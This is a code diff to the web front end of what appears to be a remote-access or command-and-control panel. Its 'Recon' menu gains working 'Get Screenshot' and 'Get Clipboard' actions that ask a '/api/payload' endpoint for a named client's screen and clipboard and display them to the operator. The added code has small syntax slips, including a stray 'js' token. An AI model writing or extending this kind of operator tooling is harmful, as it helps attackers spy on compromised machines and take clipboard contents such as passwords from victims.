@@ -72,8 +72,8 @@
                 <button type="button" class="list-group-item list-group-item-action active" aria-current="true">
                   Recon
                 </button>
-                <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">Get Screenshot</button>
-                <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">Get Clipboard</button>
+                <button type="button" class="list-group-item list-group-item-action"onclick="getScreenshot()">Get Screenshot</button>
+                <button type="button" class="list-group-item list-group-item-action"onclick="getClipboard()" id="clipboardElem""">Get Clipboard</button>
                 <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">List Users </button>
               </div><!-- End List group with Links and buttons -->
 
@@ -129,8 +129,24 @@ function getScreenshot() {
 
   xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
-        var ss = xhr.responseText;
-        console.log(ss);
+        var ss = xhr.responseText;js 
+        window.open("data:image/png;base64," + ss, '_blank');
+    }
+  }
+}
+
+function getClipboard() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", '/api/payload/clipboard', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+      "client": '{{client}}'
+  }));
+
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        var elem = document.getElementById("clipboardElem");
+        elem.innerHTML = xhr.responseText;
     }
   }
 }
